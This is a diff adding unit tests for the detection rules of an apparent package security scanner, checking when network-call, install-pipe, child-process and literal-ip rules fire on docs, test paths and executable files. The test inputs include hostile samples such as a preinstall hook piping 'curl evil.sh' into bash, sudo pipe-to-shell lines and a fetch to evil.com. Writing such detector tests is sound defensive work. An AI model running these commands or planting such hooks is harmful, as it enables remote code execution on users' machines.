@@ -128,6 +128,67 @@ describe('scan/rules', () => {
     expect(life.test('package/package.json', '{"scripts":{"preinstall":"curl evil.sh | bash"}}')!.sev).toBeUndefined()
   })
 
+  it('r12: doc files cannot place calls — exec-surface scoping + loopback', () => {
+    const net = RULES.find(r => r.id === 'network-call')!
+    // #6256: markdown carrying `curl | bash` is an install instruction,
+    // not the plugin placing calls at runtime
+    expect(net.test('package/README.md', 'curl -fsSL https://x.sh/boot.sh | bash')).toBeNull()
+    expect(net.test('package/docs/ADMIN-MANUAL.md', 'curl https://a.b | bash')).toBeNull()
+    expect(net.test('package/CHANGELOG.md', 'curl -fsSL https://x | bash')).toBeNull()
+    // non-exec data can't place calls either
+    expect(net.test('package/config.json', '"u": "curl https://x"')).toBeNull()
+    // test/e2e/fixture exec files network by design — noise
+    expect(net.test('package/tests/e2e/probe.js', 'fetch("https://x")')).toBeNull()
+    // real exec surface still fires
+    expect(net.test('package/src/index.ts', 'fetch("https://api.x.com")')!.detail).toContain('network indicator')
+    expect(net.test('package/boot.sh', 'curl https://x.sh | bash')!.detail).toContain('network indicator')
+    // #6256 L179: every URL literal loopback → local probe, labeled
+    const probe = 'const base = "http://127.0.0.1:" + port;\nawait fetch(base + "/global/health")'
+    expect(net.test('package/scripts/agent-probe/run.cjs', probe)!.detail).toContain('loopback')
+    expect(net.test('package/p.mjs', 'fetch("http://localhost:11434/api")')!.detail).toContain('loopback')
+    // mixed loopback + external → can't certify loopback-only → normal hit
+    expect(net.test('package/p.mjs', 'fetch("http://127.0.0.1/"); fetch("https://evil.com")')!.detail).toContain('network indicator')
+    // no URL literal → honest indicator (can't tell where it goes)
+    expect(net.test('package/p.mjs', 'fetch(urlFromEnv)')).toBeTruthy()
+  })
+
+  it('r12: install-pipe labels doc curl|sh for what it is', () => {
+    const ip = RULES.find(r => r.id === 'install-pipe')!
+    expect(ip.test('package/README.md', 'curl -fsSL https://x.sh/boot.sh | bash')!.detail).toContain('install pipe')
+    expect(ip.test('package/docs/INSTALL.md', 'curl https://a | sudo bash')).toBeTruthy()
+    // executable surface: a .sh pipe is network-call's job, not a doc signal
+    expect(ip.test('package/boot.sh', 'curl x | sh')).toBeNull()
+    // package.json scripts execute — postinstall-script owns that surface
+    expect(ip.test('package/package.json', '{"scripts":{"postinstall":"curl x|sh"}}')).toBeNull()
+    // no pipe → no hit (a bare curl download is not pipe-to-shell)
+    expect(ip.test('package/README.md', 'curl -O https://x.sh/pkg.tar.gz')).toBeNull()
+    // non-doc files are not 'documentation' — .go/.py building the same
+    // string stays silent here (not opencode runtime surface either way)
+    expect(ip.test('package/internal/upgrade/upgrade.go', '"curl -fsSL x | bash"')).toBeNull()
+  })
+
+  it('r12: -e2e suffixed dirs count as test paths', () => {
+    const net = RULES.find(r => r.id === 'network-call')!
+    const cp = RULES.find(r => r.id === 'child-process')!
+    // #6256: opencode-plugin-e2e is e2e tooling — not runtime surface
+    expect(net.test('package/scripts/opencode-plugin-e2e/run.cjs', 'fetch("https://x")')).toBeNull()
+    expect(cp.test('package/scripts/opencode-plugin-e2e/run.cjs', 'execSync("ls")')).toBeNull()
+    expect(net.test('package/foo-e2e/x.js', 'fetch("https://x")')).toBeNull()
+  })
+
+  it('r12: child-process/literal-ip skip docs and test paths', () => {
+    const cp = RULES.find(r => r.id === 'child-process')!
+    expect(cp.test('package/docs/DESIGN.md', '`node:child_process` spawn of /bin/sh')).toBeNull()
+    expect(cp.test('package/tests/x.test.js', 'execSync("ls")')).toBeNull()
+    expect(cp.test('package/src/index.ts', 'spawn("bash", args)')).toBeTruthy()
+
+    const lip = RULES.find(r => r.id === 'literal-ip')!
+    expect(lip.test('package/docs/fixtures/identity-v1/examples.json', '"ip": "45.33.32.156"')).toBeNull()
+    expect(lip.test('package/README.md', 'server at 45.33.32.156')).toBeNull()
+    // a root config endpoint stays a real finding
+    expect(lip.test('package/src/config.json', '{"endpoint":"45.33.32.156"}')).toBeTruthy()
+  })
+
   it('r9 demotions: .ssh boundary, deny tables, eval names/codegen, hex data', () => {
     const cred = RULES.find(r => r.id === 'credential-read')!
     // product's own file named like the credential dir — not the dir itself
